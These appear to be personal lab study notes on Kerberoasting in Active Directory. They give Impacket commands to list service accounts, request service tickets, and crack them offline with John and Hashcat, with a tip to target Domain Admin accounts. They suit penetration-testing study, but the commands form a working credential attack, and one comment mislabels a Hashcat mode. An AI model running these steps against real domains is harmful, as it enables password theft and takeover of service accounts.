#AD_Kerberoast

____

# <span style="color:#FF5555">Explanation</span>

**Kerberoasting targets service accounts that have an SPN (a service identifier).** #AD_DEFINATION_SPN

- When a user asks to access a service, they receive a **Service Ticket (ST)**
- This ticket is **encrypted using the service account’s password**

 If an attacker gets this ticket:
- They can take it offline
- Try to **crack it to find the service account password**

> [!info] Prerequisite
> Kerberoasting requires valid domain user credentials to request a service ticket.


### <span style="color:#50FA7B">What do you need before running Kerberoasting?</span>

-  You must have **valid domain user credentials**  
-  You must be **able to query the domain controller**  
-  You want to **find accounts that have SPNs set** (meaning they're running services

____
# <span style="color:#FF5555">Step-by-Step Attack From Linux (Using Impacket)</span>

# <span style="color:#FF5555">1. Install Impacket</span>

```bash
git clone https://github.com/fortra/impacket
cd impacket
sudo python3 -m pip install .
```
# <span style="color:#FF5555">2. List SPNs (Service Accounts)</span>

Check kerberoastable users using the Impacket's module GetUserSPNs.py
```bash
# Lists all accounts with SPNs (service accounts)
GetUserSPNs.py $DOMAIN/devan:'Password123!' -dc-ip $DC_IP
# Same command structure for any domain/user
GetUserSPNs.py $DOMAIN/<USERNAME>:'<PASSWORD>' -dc-ip $DC_IP
```

It will searches for **accounts that have SPNs (service accounts)**
 ![[Pasted image 20260415143235.png]]
in this case there're two vulnerable users: 'kerberoasting' and 'angel'.

> [!tip] Check for Domain Admins
> **Check if any are Domain Admins!** Those are jackpot targets.

# <span style="color:#FF5555">3. **Request All TGS Ticket**</span>

```bash
# **Request All TGS Tickets (for all SPNs)**
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/<USERNAME>:'<PASSWORD>' -request

# Request Ticket for a Specific Account (Optiona)
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/<USERNAME>:'<PASSWORD>' -request-user <TARGET_ACCOUNT>

#example
GetUserSPNs.py $DOMAIN/devan:'Password123!' -dc-ip $DC_IP -request #without specifing a user it checks all possible tickets
GetUserSPNs.py $DOMAIN/devan:'Password123!' -dc-ip $DC_IP -request-user kerberoasting | grep '\$krb5tgs\$' > kerberoast.txt
```

![[Pasted image 20260415150325.png]]

# <span style="color:#FF5555">4. **Crack the TGS Ticket (Offline)**</span>

```bash
# Cracks with John the Ripper
john --wordlist=/home/kali/Documents/password.txt ./kerberoast.txt
# Cracks with Hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 ./kerberoast.txt /home/kali/Documents/password.txt
# Alternative mode for RC4 encrypted tickets
hashcat -m 13100 --force kerberoast.txt rockyou.txt
```
![[Pasted image 20260415150436.png]]


# <span style="color:#FF5555">Troubleshooting: Clock Skew Errors</span>
If you encounter `KRB_AP_ERR_SKEW (Clock skew too great)`, synchronize the clocks with:

```bash
# Disables automatic time sync
sudo timedatectl set-ntp off
# Checks time difference with DC
ntpdate -q $DC_IP
# Forces time sync with DC
ntpdate -u $DC_IP
```